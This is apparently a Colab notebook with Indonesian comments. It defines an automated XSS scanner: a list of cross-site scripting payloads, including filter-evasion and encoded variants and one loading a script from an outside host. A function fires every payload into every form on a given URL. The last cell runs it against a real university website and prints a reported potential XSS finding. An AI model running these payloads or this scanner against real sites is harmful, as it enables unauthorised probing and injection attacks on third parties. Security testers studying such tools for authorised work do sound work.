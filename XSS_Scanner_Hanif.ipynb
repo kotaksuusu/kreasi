{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyNHhyqO3CjOykOnsJpCxVZb",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/kotaksuusu/kreasi/blob/main/XSS_Scanner_Hanif.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install requests beautifulsoup4"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Q9PkbtiPvhX5",
        "outputId": "26ddfc7e-e28f-43b0-9f77-4bfb973ccfff"
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: requests in /usr/local/lib/python3.11/dist-packages (2.32.3)\n",
            "Requirement already satisfied: beautifulsoup4 in /usr/local/lib/python3.11/dist-packages (4.13.4)\n",
            "Requirement already satisfied: charset-normalizer<4,>=2 in /usr/local/lib/python3.11/dist-packages (from requests) (3.4.2)\n",
            "Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.11/dist-packages (from requests) (3.10)\n",
            "Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/local/lib/python3.11/dist-packages (from requests) (2.4.0)\n",
            "Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.11/dist-packages (from requests) (2025.4.26)\n",
            "Requirement already satisfied: soupsieve>1.2 in /usr/local/lib/python3.11/dist-packages (from beautifulsoup4) (2.7)\n",
            "Requirement already satisfied: typing-extensions>=4.0.0 in /usr/local/lib/python3.11/dist-packages (from beautifulsoup4) (4.13.2)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "id": "OTgei9zTvawx"
      },
      "outputs": [],
      "source": [
        "import requests\n",
        "from bs4 import BeautifulSoup\n",
        "\n",
        "# Daftar payload XSS lengkap\n",
        "payloads = [\n",
        "    # Basic script tags\n",
        "    \"<script>alert(1)</script>\",\n",
        "    \"<script>alert(String.fromCharCode(88,83,83))</script>\",\n",
        "    \"<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>\",\n",
        "\n",
        "    # HTML attribute injections\n",
        "    \"\\\"><script>alert(1)</script>\",\n",
        "    \"'><script>alert(1)</script>\",\n",
        "    \"';alert(1);//\",\n",
        "    \"\\\" onmouseover=\\\"alert(1)\",\n",
        "    \"<body onload=alert(1)>\",\n",
        "\n",
        "    # Event handler attacks\n",
        "    \"<img src=x onerror=alert(1)>\",\n",
        "    \"<iframe src='javascript:alert(1)'></iframe>\",\n",
        "    \"<svg/onload=alert(1)>\",\n",
        "    \"<details open ontoggle=alert(1)>\",\n",
        "    \"<video><source onerror='alert(1)'></video>\",\n",
        "    \"<input onfocus=alert(1) autofocus>\",\n",
        "\n",
        "    # JavaScript pseudo-scheme\n",
        "    \"javascript:alert(1)\",\n",
        "\n",
        "    # Bypass with variations & filter evasion\n",
        "    \"<scr<script>ipt>alert(1)</scr<script>ipt>\",\n",
        "    \"<scri<script>pt>alert(1)</scri<script>pt>\",\n",
        "    \"<svg><desc><![CDATA[><script>alert(1)</script>]]></desc></svg>\",\n",
        "    \"<math><mtext><title><img src=x onerror=alert(1)></title></mtext></math>\",\n",
        "\n",
        "    # Encoded payloads\n",
        "    \"%3Cscript%3Ealert(1)%3C/script%3E\",\n",
        "    \"&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;\",\n",
        "\n",
        "    # Null byte trick\n",
        "    \"<script\\x00>alert(1)</script>\",\n",
        "\n",
        "    # Style-based\n",
        "    \"<div style=\\\"background-image:url(javascript:alert(1))\\\">\",\n",
        "\n",
        "    # Object tag\n",
        "    \"<object data='javascript:alert(1)'></object>\",\n",
        "]\n",
        "\n",
        "def scan_forms_xss(url):\n",
        "    print(f\"[+] Mengakses: {url}\")\n",
        "    try:\n",
        "        response = requests.get(url, timeout=10)\n",
        "        soup = BeautifulSoup(response.text, 'html.parser')\n",
        "        forms = soup.find_all('form')\n",
        "\n",
        "        if not forms:\n",
        "            print(\"[-] Tidak ada form ditemukan.\")\n",
        "            return\n",
        "\n",
        "        print(f\"[+] Ditemukan {len(forms)} form. Mulai scanning...\\n\")\n",
        "\n",
        "        for i, form in enumerate(forms):\n",
        "            action = form.get('action')\n",
        "            method = form.get('method', 'get').lower()\n",
        "            inputs = form.find_all(['input', 'textarea', 'select'])\n",
        "            data = {}\n",
        "\n",
        "            for inp in inputs:\n",
        "                name = inp.get('name')\n",
        "                if name:\n",
        "                    data[name] = \"XSS_TEST\"\n",
        "\n",
        "            for payload in payloads:\n",
        "                test_data = {k: payload for k in data}\n",
        "                target_url = url if not action or action in ['#', ''] else action\n",
        "                full_url = target_url if target_url.startswith('http') else requests.compat.urljoin(url, target_url)\n",
        "\n",
        "                if method == \"post\":\n",
        "                    res = requests.post(full_url, data=test_data)\n",
        "                else:\n",
        "                    res = requests.get(full_url, params=test_data)\n",
        "\n",
        "                if payload in res.text:\n",
        "                    print(f\"[!!] POTENSI XSS TERDETEKSI!\")\n",
        "                    print(f\"     Form ke-{i+1}\")\n",
        "                    print(f\"     Method  : {method.upper()}\")\n",
        "                    print(f\"     Payload : {payload}\")\n",
        "                    print(f\"     URL     : {full_url}\\n\")\n",
        "                    break  # Stop jika payload pertama langsung masuk\n",
        "\n",
        "        print(\"[+] Selesai scanning form.\\n\")\n",
        "\n",
        "    except Exception as e:\n",
        "        print(f\"[ERROR] Gagal akses URL: {str(e)}\")\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "scan_forms_xss(\"https://web.polines.ac.id/\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "DkQu1u91vwbC",
        "outputId": "c82a6769-7ec2-419f-8752-fb8947b01110"
      },
      "execution_count": 9,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "[+] Mengakses: https://web.polines.ac.id/\n",
            "[+] Ditemukan 1 form. Mulai scanning...\n",
            "\n",
            "[!!] POTENSI XSS TERDETEKSI!\n",
            "     Form ke-1\n",
            "     Method  : GET\n",
            "     Payload : javascript:alert(1)\n",
            "     URL     : https://web.polines.ac.id/en_us/\n",
            "\n",
            "[+] Selesai scanning form.\n",
            "\n"
          ]
        }
      ]
    }
  ]
}